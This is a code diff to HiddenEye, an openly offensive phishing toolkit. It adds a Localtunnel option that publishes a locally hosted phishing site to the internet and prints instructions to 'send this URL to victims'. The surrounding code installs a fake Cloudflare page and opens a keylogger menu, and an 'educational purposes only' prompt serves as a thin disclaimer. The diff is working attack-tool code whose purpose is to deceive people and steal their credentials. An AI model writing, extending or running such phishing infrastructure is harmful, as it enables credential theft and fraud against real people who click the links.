@@ -158,9 +158,8 @@ def selectServer(port): #Question where user must select server
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-        print(_("\n {1}[{0}!{1}]{1}(LOCALXPOSE/SERVEO WORKS BETTER)").format(MAIN0, MAIN2))
         print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(MAIN0, MAIN4))
-        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose").format(MAIN0, MAIN2))
+        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]").format(MAIN0, MAIN2))
 
         choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         if choice == '1':
@@ -172,7 +171,12 @@ def selectServer(port): #Question where user must select server
         elif choice == '3':
             system('clear')
             runLocalxpose(port)    
-
+        elif choice == '4':
+            system('clear')
+            runLT(port,True)
+        elif choice=='5':
+            system('clear')
+            runLT(port,False)
         else:
             system('clear')
             return selectServer(port)
@@ -344,6 +348,39 @@ def randomServeo(port):
         system('clear')
         return randomServeo(port)
 
+def runLT(port,npm):
+    system('clear')
+    print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+    print(_("\n{0}[{1}*{0}]{0}SELECT ANY URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2))
+    print(_("\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL").format(MAIN0, MAIN2))
+    s=input(('\n{0}(Localtunnel/Subdomain)> {2}').format(MAIN0,MAIN4,MAIN2))
+    try:
+        system('{0}lt -p '.format('' if npm else 'Server/')+port+((' -s '+s) if s!='' else s)+' > link.url &')
+        sleep(3)
+        system('clear')
+        print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}".format(MAIN0, MAIN2, MAIN3, port, str(check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)).strip("b ' \ n r")))
+    except CalledProcessError:
+        system('clear')
+        print(_('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        print('{0}error[invalid/preoccupied]{0}'.format(MAIN0))
+        runLT(port,npm)
+
 def runMainMenu(): #menu where user select what they wanna use
 
     if 256 != system('which php > /dev/null'): #Checking if user have PHP
@@ -357,7 +394,7 @@ def runMainMenu(): #menu where user select what they wanna use
         stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(MAIN0, MAIN4, i))
         stdout.flush()
 
-    if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}y{1}/{2}n{1})\n{2}HiddenEye >>> {0}").format(MAIN2, MAIN4, MAIN0)).upper() != 'Y': #Question where user must accept education purposes
+    if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}").format(MAIN2, MAIN4, MAIN0)).upper() != 'Y' : #Question where user must accept education purposes
         system('clear')
         print (_('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n').format(MAIN0, MAIN4))
         exit(0)
@@ -679,7 +716,7 @@ def addingCloudfare():
 def addCloudfare():
          system('mv Server/www/index.* Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
          print(_("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...").format(MAIN0, MAIN4))
-         sleep(2)
+         sleep(1)
 		
 def keyloggerprompt():
 	system('clear')
